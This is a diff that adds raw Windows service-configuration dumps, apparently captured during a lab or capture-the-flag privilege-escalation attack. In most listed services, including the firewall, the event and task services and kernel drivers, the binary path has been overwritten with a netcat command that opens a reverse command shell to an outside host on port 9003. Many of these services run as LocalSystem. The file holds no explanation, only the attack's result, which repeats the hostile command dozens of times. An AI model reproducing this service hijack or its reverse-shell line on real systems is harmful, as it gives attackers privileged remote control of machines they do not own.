@@ -1,0 +1,840 @@
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: applockerfltr
+        TYPE               : 1  KERNEL_DRIVER 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Smartlocker Filter Driver
+        DEPENDENCIES       : FltMgr
+                           : AppID
+                           : AppIDSvc
+        SERVICE_START_NAME : 
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: AppMgmt
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Application Management
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: AppVClient
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 4   DISABLED
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Microsoft App-V Client
+        DEPENDENCIES       : RpcSS
+                           : netprofm
+                           : AppvVfs
+                           : AppVStrm
+        SERVICE_START_NAME : LocalSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: BFE
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : NetworkProvider
+        TAG                : 0
+        DISPLAY_NAME       : Base Filtering Engine
+        DEPENDENCIES       : RpcSs
+        SERVICE_START_NAME : NT AUTHORITY\LocalService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: BrokerInfrastructure
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : COM Infrastructure
+        TAG                : 0
+        DISPLAY_NAME       : Background Tasks Infrastructure Service
+        DEPENDENCIES       : RpcEptMapper
+                           : DcomLaunch
+                           : RpcSs
+        SERVICE_START_NAME : LocalSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: CLFS
+        TYPE               : 1  KERNEL_DRIVER 
+        START_TYPE         : 0   BOOT_START
+        ERROR_CONTROL      : 3   CRITICAL
+        BINARY_PATH_NAME   : \SystemRoot\C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : Filter
+        TAG                : 1
+        DISPLAY_NAME       : Common Log (CLFS)
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : 
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: ConsentUxUserSvc
+        TYPE               : 60  USER_SHARE_PROCESS TEMPLATE  
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : ConsentUX
+        DEPENDENCIES       : RpcSs
+        SERVICE_START_NAME : LocalSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: ConsentUxUserSvc_4d5c5
+        TYPE               : e0  USER_SHARE_PROCESS INSTANCE  
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : ConsentUX_4d5c5
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : 
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: DcomLaunch
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k DcomLaunch -p
+        LOAD_ORDER_GROUP   : COM Infrastructure
+        TAG                : 0
+        DISPLAY_NAME       : DCOM Server Process Launcher
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: DevicePickerUserSvc
+        TYPE               : 60  USER_SHARE_PROCESS TEMPLATE  
+        START_TYPE         : 4   DISABLED
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : DevicePicker
+        DEPENDENCIES       : RpcSs
+        SERVICE_START_NAME : LocalSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: DevicePickerUserSvc_4d5c5
+        TYPE               : e0  USER_SHARE_PROCESS INSTANCE  
+        START_TYPE         : 4   DISABLED
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : DevicePicker_4d5c5
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : 
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: DevicesFlowUserSvc
+        TYPE               : 60  USER_SHARE_PROCESS TEMPLATE  
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : DevicesFlow
+        DEPENDENCIES       : RpcSs
+        SERVICE_START_NAME : LocalSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: DevicesFlowUserSvc_4d5c5
+        TYPE               : e0  USER_SHARE_PROCESS INSTANCE  
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : DevicesFlow_4d5c5
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : 
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: Dhcp
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p
+        LOAD_ORDER_GROUP   : TDI
+        TAG                : 0
+        DISPLAY_NAME       : DHCP Client
+        DEPENDENCIES       : NSI
+                           : Afd
+        SERVICE_START_NAME : NT Authority\LocalService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: Dnscache
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : TDI
+        TAG                : 0
+        DISPLAY_NAME       : DNS Client
+        DEPENDENCIES       : nsi
+        SERVICE_START_NAME : NT AUTHORITY\NetworkService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: DoSvc
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Delivery Optimization
+        DEPENDENCIES       : rpcss
+        SERVICE_START_NAME : NT Authority\NetworkService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: EventLog
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
+        LOAD_ORDER_GROUP   : Event Log
+        TAG                : 0
+        DISPLAY_NAME       : Windows Event Log
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : NT AUTHORITY\LocalService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: KtmRm
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : KtmRm for Distributed Transaction Coordinator
+        DEPENDENCIES       : RPCSS
+                           : SamSS
+        SERVICE_START_NAME : NT AUTHORITY\NetworkService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: LSM
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : COM Infrastructure
+        TAG                : 0
+        DISPLAY_NAME       : Local Session Manager
+        DEPENDENCIES       : RpcEptMapper
+                           : DcomLaunch
+                           : RpcSs
+        SERVICE_START_NAME : LocalSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: mpsdrv
+        TYPE               : 1  KERNEL_DRIVER 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : network
+        TAG                : 0
+        DISPLAY_NAME       : Windows Defender Firewall Authorization Driver
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : 
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: mpssvc
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : NetworkProvider
+        TAG                : 0
+        DISPLAY_NAME       : Windows Defender Firewall
+        DEPENDENCIES       : mpsdrv
+                           : bfe
+        SERVICE_START_NAME : NT Authority\LocalService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: MSDTC
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 2   AUTO_START  (DELAYED)
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Distributed Transaction Coordinator
+        DEPENDENCIES       : RPCSS
+                           : SamSS
+        SERVICE_START_NAME : NT AUTHORITY\NetworkService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: MSDTC
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 2   AUTO_START  (DELAYED)
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Distributed Transaction Coordinator
+        DEPENDENCIES       : RPCSS
+                           : SamSS
+        SERVICE_START_NAME : NT AUTHORITY\NetworkService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: NetBT
+        TYPE               : 1  KERNEL_DRIVER 
+        START_TYPE         : 1   SYSTEM_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : System32\DRIVERS\netbt.sys
+        LOAD_ORDER_GROUP   : PNP_TDI
+        TAG                : 0
+        DISPLAY_NAME       : NetBT
+        DEPENDENCIES       : Tdx
+                           : tcpip
+        SERVICE_START_NAME : 
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: NetSetupSvc
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Network Setup Service
+        DEPENDENCIES       : RpcSs
+        SERVICE_START_NAME : LocalSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: NetTcpPortSharing
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 4   DISABLED
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Net.Tcp Port Sharing Service
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : NT AUTHORITY\LocalService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: NgcCtnrSvc
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : Cryptography
+        TAG                : 0
+        DISPLAY_NAME       : Microsoft Passport Container
+        DEPENDENCIES       : RpcSs
+        SERVICE_START_NAME : NT AUTHORITY\LocalService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: NgcSvc
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : Cryptography
+        TAG                : 0
+        DISPLAY_NAME       : Microsoft Passport
+        DEPENDENCIES       : RpcSs
+        SERVICE_START_NAME : LocalSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: PimIndexMaintenanceSvc
+        TYPE               : 60  USER_SHARE_PROCESS TEMPLATE  
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Contact Data
+        DEPENDENCIES       : UnistoreSvc
+        SERVICE_START_NAME : LocalSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: PimIndexMaintenanceSvc_4d5c5
+        TYPE               : e0  USER_SHARE_PROCESS INSTANCE  
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Contact Data_4d5c5
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : 
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: pla
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Performance Logs & Alerts
+        DEPENDENCIES       : RPCSS
+        SERVICE_START_NAME : NT AUTHORITY\LocalService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: PrintWorkflowUserSvc
+        TYPE               : 60  USER_SHARE_PROCESS TEMPLATE  
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : PrintWorkflow
+        DEPENDENCIES       : RpcSs
+        SERVICE_START_NAME : LocalSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: PrintWorkflowUserSvc_4d5c5
+        TYPE               : e0  USER_SHARE_PROCESS INSTANCE  
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : PrintWorkflow_4d5c5
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : 
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: RasAcd
+        TYPE               : 1  KERNEL_DRIVER 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : Streams Drivers
+        TAG                : 1
+        DISPLAY_NAME       : Remote Access Auto Connection Driver
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : 
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: RasAuto
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k netsvcs -p
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Remote Access Auto Connection Manager
+        DEPENDENCIES       : RasAcd
+        SERVICE_START_NAME : localSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: RasMan
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k netsvcs
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Remote Access Connection Manager
+        DEPENDENCIES       : SstpSvc
+                           : DnsCache
+        SERVICE_START_NAME : localSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: RemoteAccess
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 4   DISABLED
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k netsvcs
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Routing and Remote Access
+        DEPENDENCIES       : RpcSS
+                           : Bfe
+                           : RasMan
+                           : Http
+                           : +NetBIOSGroup
+        SERVICE_START_NAME : localSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: RmSvc
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 4   DISABLED
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Radio Management Service
+        DEPENDENCIES       : RpcSs
+        SERVICE_START_NAME : NT AUTHORITY\LocalService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: RpcEptMapper
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : COM Infrastructure
+        TAG                : 0
+        DISPLAY_NAME       : RPC Endpoint Mapper
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : NT AUTHORITY\NetworkService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: RpcSs
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k rpcss -p
+        LOAD_ORDER_GROUP   : COM Infrastructure
+        TAG                : 0
+        DISPLAY_NAME       : Remote Procedure Call (RPC)
+        DEPENDENCIES       : RpcEptMapper
+                           : DcomLaunch
+        SERVICE_START_NAME : NT AUTHORITY\NetworkService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: RSoPProv
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Resultant Set of Policy Provider
+        DEPENDENCIES       : RPCSS
+        SERVICE_START_NAME : LocalSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: SamSs
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\system32\lsass.exe
+        LOAD_ORDER_GROUP   : MS_WindowsLocalValidation
+        TAG                : 0
+        DISPLAY_NAME       : Security Accounts Manager
+        DEPENDENCIES       : RPCSS
+        SERVICE_START_NAME : LocalSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: Schedule
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : SchedulerGroup
+        TAG                : 0
+        DISPLAY_NAME       : Task Scheduler
+        DEPENDENCIES       : RPCSS
+                           : SystemEventsBroker
+        SERVICE_START_NAME : LocalSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: seclogon
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Secondary Logon
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: SecurityHealthService
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Windows Security Service
+        DEPENDENCIES       : RpcSs
+        SERVICE_START_NAME : LocalSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: SENS
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : ProfSvc_Group
+        TAG                : 0
+        DISPLAY_NAME       : System Event Notification Service
+        DEPENDENCIES       : EventSystem
+        SERVICE_START_NAME : LocalSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: smphost
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Microsoft Storage Spaces SMP
+        DEPENDENCIES       : RPCSS
+        SERVICE_START_NAME : NT AUTHORITY\NetworkService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: Spooler
+        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : SpoolerGroup
+        TAG                : 0
+        DISPLAY_NAME       : Print Spooler
+        DEPENDENCIES       : RPCSS
+                           : http
+        SERVICE_START_NAME : LocalSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: SstpSvc
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Secure Socket Tunneling Protocol Service
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : NT Authority\LocalService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: SystemEventsBroker
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : System Events Broker
+        DEPENDENCIES       : RpcEptMapper
+                           : RpcSs
+        SERVICE_START_NAME : LocalSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: TimeBrokerSvc
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Time Broker
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : NT AUTHORITY\LocalService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: UevAgentService
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 4   DISABLED
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : ProfSvc_Group
+        TAG                : 0
+        DISPLAY_NAME       : User Experience Virtualization Service
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: UnistoreSvc
+        TYPE               : 60  USER_SHARE_PROCESS TEMPLATE  
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : User Data Storage
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: UnistoreSvc_4d5c5
+        TYPE               : e0  USER_SHARE_PROCESS INSTANCE  
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : User Data Storage_4d5c5
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : 
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: UserDataSvc
+        TYPE               : 60  USER_SHARE_PROCESS TEMPLATE  
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : User Data Access
+        DEPENDENCIES       : UnistoreSvc
+        SERVICE_START_NAME : LocalSystem
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: UserDataSvc_4d5c5
+        TYPE               : e0  USER_SHARE_PROCESS INSTANCE  
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:/users/hector/desktop/nc64.exe 10.10.14.26 9003 -e cmd
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : User Data Access_4d5c5
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : 
+[SC] QueryServiceConfig SUCCESS
+
